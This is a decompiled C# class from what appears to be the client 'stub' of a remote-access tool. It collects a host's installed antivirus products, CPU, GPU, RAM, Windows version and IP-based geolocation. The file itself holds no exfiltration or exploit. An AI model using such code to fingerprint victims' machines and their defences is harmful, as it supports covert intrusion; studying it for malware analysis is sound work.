using System;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Text;
using Microsoft.Win32;

namespace VanillaStub.Helpers.Information;

internal class ComputerInfo
{
	public static GeoInfo GeoInfo { get; private set; }

	public static string RemoveLastChars(string input, int amount = 2)
	{
		if (input.Length > amount)
		{
			input = input.Remove(input.Length - amount);
		}
		return input;
	}

	public static string GetAntivirus()
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			bool flag = false;
			string text2 = "\\\\" + Environment.MachineName + "\\root\\SecurityCenter2";
			ManagementObjectSearcher val = new ManagementObjectSearcher(text2, "SELECT * FROM AntivirusProduct");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						if (current.GetPropertyValue("displayName").ToString() == "Windows Defender")
						{
							flag = true;
						}
						if (current.GetPropertyValue("displayName").ToString() != "Windows Defender")
						{
							text = current.GetPropertyValue("displayName").ToString();
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				if (text == string.Empty && flag)
				{
					text = "Windows Defender";
				}
				if (text == "")
				{
					text = "N/A";
				}
				return text;
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			return "N/A";
		}
	}

	public static string GetName()
	{
		return Environment.MachineName;
	}

	public static string GetGPU()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementObject val2 = (ManagementObject)enumerator.get_Current();
						text = text + ((ManagementBaseObject)val2).get_Item("Description")?.ToString() + " ;";
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			text = RemoveLastChars(text);
			return (!string.IsNullOrEmpty(text)) ? text : "N/A";
		}
		catch
		{
			return "N/A";
		}
	}

	public static string GetCPU()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementObject val2 = (ManagementObject)enumerator.get_Current();
						text = text + ((ManagementBaseObject)val2).get_Item("Name")?.ToString() + "; ";
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			text = RemoveLastChars(text);
			return (!string.IsNullOrEmpty(text)) ? text : "N/A";
		}
		catch
		{
		}
		return "N/A";
	}

	public static int GetRamAmount()
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		try
		{
			int result = 0;
			ManagementObjectSearcher val = new ManagementObjectSearcher("Select * From Win32_ComputerSystem");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					if (enumerator.MoveNext())
					{
						ManagementObject val2 = (ManagementObject)enumerator.get_Current();
						double num = Convert.ToDouble(((ManagementBaseObject)val2).get_Item("TotalPhysicalMemory"));
						result = (int)(num / 1048576.0);
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			return result;
		}
		catch
		{
			return -1;
		}
	}

	public static void GetGeoInfo()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		try
		{
			DataContractJsonSerializer val = new DataContractJsonSerializer(typeof(GeoInfo));
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://ip-api.com/json/");
			httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0";
			httpWebRequest.Proxy = null;
			httpWebRequest.Timeout = 10000;
			using HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			using Stream stream = httpWebResponse.GetResponseStream();
			using StreamReader streamReader = new StreamReader(stream);
			string s = streamReader.ReadToEnd();
			using MemoryStream memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(s));
			GeoInfo = (GeoInfo)((XmlObjectSerializer)val).ReadObject((Stream)memoryStream);
		}
		catch
		{
		}
		GeoInfo.Ip = (string.IsNullOrEmpty(GeoInfo.Ip) ? "N/A" : GeoInfo.Ip);
		GeoInfo.Country = (string.IsNullOrEmpty(GeoInfo.Country) ? "N/A" : GeoInfo.Country);
		GeoInfo.CountryCode = (string.IsNullOrEmpty(GeoInfo.CountryCode) ? "-" : GeoInfo.CountryCode);
		GeoInfo.Region = (string.IsNullOrEmpty(GeoInfo.Region) ? "N/A" : GeoInfo.Region);
		GeoInfo.City = (string.IsNullOrEmpty(GeoInfo.City) ? "N/A" : GeoInfo.City);
		GeoInfo.Timezone = (string.IsNullOrEmpty(GeoInfo.Timezone) ? "N/A" : GeoInfo.Timezone);
		GeoInfo.Isp = (string.IsNullOrEmpty(GeoInfo.Isp) ? "N/A" : GeoInfo.Isp);
		GeoInfo.Org = (string.IsNullOrEmpty(GeoInfo.Org) ? "N/A" : GeoInfo.Org);
	}

	[DllImport("kernel32.dll")]
	private static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetModuleHandle(string moduleName);

	[DllImport("kernel32")]
	private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	public static bool Is64BitOperatingSystem()
	{
		if (IntPtr.Size == 8)
		{
			return true;
		}
		IntPtr moduleHandle = GetModuleHandle("kernel32");
		if (moduleHandle != IntPtr.Zero)
		{
			IntPtr procAddress = GetProcAddress(moduleHandle, "IsWow64Process");
			if (procAddress != IntPtr.Zero && IsWow64Process(GetCurrentProcess(), out var wow64Process) && wow64Process)
			{
				return true;
			}
		}
		return false;
	}

	private static string HKLM_GetString(string key, string value)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(key);
			object obj;
			if (registryKey == null)
			{
				obj = null;
			}
			else
			{
				obj = registryKey.GetValue(value)!.ToString();
				if (obj != null)
				{
					goto IL_0028;
				}
			}
			obj = string.Empty;
			goto IL_0028;
			IL_0028:
			return (string)obj;
		}
		catch
		{
			return string.Empty;
		}
	}

	public static string GetWindowsVersion()
	{
		string text;
		try
		{
			text = (Is64BitOperatingSystem() ? "64-bit" : "32-bit");
		}
		catch (Exception)
		{
			text = "32/64-bit (Undetermined)";
		}
		string text2 = HKLM_GetString("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
		string text3 = HKLM_GetString("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CSDVersion");
		string text4 = HKLM_GetString("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuild");
		if (!string.IsNullOrEmpty(text2))
		{
			return text2 + ((!string.IsNullOrEmpty(text3)) ? (" " + text3) : string.Empty) + " " + text + " (OS Build " + text4 + ")";
		}
		return string.Empty;
	}
}
